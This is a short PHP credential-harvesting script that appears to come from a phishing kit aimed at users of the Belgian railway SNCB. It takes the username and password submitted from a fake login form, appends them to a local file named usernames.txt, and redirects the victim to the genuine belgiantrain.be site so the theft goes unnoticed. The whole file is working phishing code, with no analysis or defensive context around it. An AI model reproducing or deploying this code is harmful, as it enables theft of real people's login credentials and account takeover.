<?php

file_put_contents("usernames.txt", "SNCB Username: " . $_POST['session_key'] . " Pass: " . $_POST['session_password'] . "\n", FILE_APPEND);
header('Location: https://www.belgiantrain.be/fr');
exit();
?>
